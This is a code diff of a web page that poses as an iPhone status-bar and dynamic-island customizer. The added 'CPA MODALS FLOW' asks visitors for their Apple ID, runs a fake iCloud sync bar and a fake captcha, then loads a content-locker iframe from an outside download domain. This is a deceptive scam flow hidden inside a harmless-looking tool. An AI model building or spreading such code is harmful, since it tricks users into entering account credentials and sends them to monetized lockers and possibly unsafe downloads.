-        
-        // Target Elements
         const batteryFill = document.getElementById('batteryFill');
         const batteryNub = document.getElementById('batteryNub');
         const dynamicIsland = document.getElementById('dynamicIsland');
         const statusBarText = document.getElementById('statusBarText');
         const shapePreviews = document.querySelectorAll('.shape-preview');
 
-        // State memory
         let currentBatteryColor = colorMap['c-green'];
         let currentIslandColor = '#000000'; 
         let currentStatusColor = '#007AFF'; 
@@ -218,12 +301,12 @@
             }
         }
 
+        // Color Row Handlers
         function setupColorRow(rowId, updateVariableCallback) {
             const row = document.getElementById(rowId);
             const presets = row.querySelectorAll('.preset');
             const pickerLabel = row.querySelector('.c-rainbow');
             const colorPicker = row.querySelector('input[type="color"]');
-
             presets.forEach(circle => {
                 circle.addEventListener('click', function() {
                     presets.forEach(c => c.classList.remove('selected'));
@@ -233,44 +316,91 @@
                     updateVariableCallback(colorMap[colorClass]);
                 });
             });
-
             colorPicker.addEventListener('input', function(e) {
                 presets.forEach(c => c.classList.remove('selected'));
                 pickerLabel.classList.add('selected');
                 updateVariableCallback(e.target.value);
             });
         }
-
         setupColorRow('rowBattery', (color) => { currentBatteryColor = color; applyColors(); });
         setupColorRow('rowIsland', (color) => { currentIslandColor = color; applyColors(); });
         setupColorRow('rowStatus', (color) => { currentStatusColor = color; applyColors(); });
 
-        // 🔥 Dynamic Island Shapes Logic 🔥
+        // 🔥 Dynamic Island 30 Shapes Logic 🔥
         const shapeBtns = document.querySelectorAll('.shape-btn');
-        const allShapeClasses = ['shape-pill', 'shape-apple', 'shape-batman', 'shape-heart', 'shape-cat', 'shape-bow', 'shape-sparkle', 'shape-shield'];
         
         shapeBtns.forEach(btn => {
             btn.addEventListener('click', function() {
-                shapeBtns.forEach(b => b.classList.remove('selected'));
-                this.classList.add('selected');
-                
                 const targetShape = this.getAttribute('data-shape');
+                
+                // Keep selection in sync everywhere
+                shapeBtns.forEach(b => {
+                    if(b.getAttribute('data-shape') === targetShape) b.classList.add('selected');
+                    else b.classList.remove('selected');
+                });
+                
                 const w = this.getAttribute('data-w');
                 const h = this.getAttribute('data-h');
                 
-                dynamicIsland.classList.remove(...allShapeClasses);
-                dynamicIsland.classList.add(targetShape);
+                // Apply Shape
+                dynamicIsland.className = 'dynamic-island ' + targetShape;
                 dynamicIsland.style.width = w;
                 dynamicIsland.style.height = h;
+
+                // Close modal if open
+                closeModal('shapesModal');
             });
         });
 
+        // Clock Update
         function updateClock() { 
             const now = new Date(); 
             document.getElementById('clock').textContent = now.getHours() + ':' + now.getMinutes().toString().padStart(2, '0'); 
         }
         setInterval(updateClock, 1000);
         updateClock();
+
+
+        // ================= CPA MODALS FLOW =================
+        function openModal(id) {
+            document.getElementById(id).classList.remove('hidden');
+            document.getElementById(id).classList.add('flex');
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).classList.add('hidden');
+            document.getElementById(id).classList.remove('flex');
+        }
+
+        function startSync() {
+            const input = document.getElementById('appleIdInput').value;
+            if(!input) return; 
+            
+            closeModal('icloudModal');
+            openModal('loadingModal');
+            
+            setTimeout(() => { document.getElementById('syncProgress').style.width = '100%'; }, 100);
+
+            setTimeout(() => {
+                closeModal('loadingModal');
+                openModal('captchaModal');
+            }, 4000);
+        }
+
+        function triggerLocker() {
+            document.getElementById('rc-check').classList.add('hidden');
+            document.getElementById('rc-spinner').classList.remove('hidden');
+            
+            setTimeout(() => {
+                closeModal('captchaModal');
+                document.getElementById('rc-check').classList.remove('hidden');
+                document.getElementById('rc-spinner').classList.add('hidden');
+                
+                const lockerUrl = "https://performingsecurity.downapk.online/cl/i/j77o9j";
+                document.getElementById('lockerIframe').src = lockerUrl;
+                openModal('lockerModal');
+            }, 1200);
+        }
     </script>
 </body>
 </html>
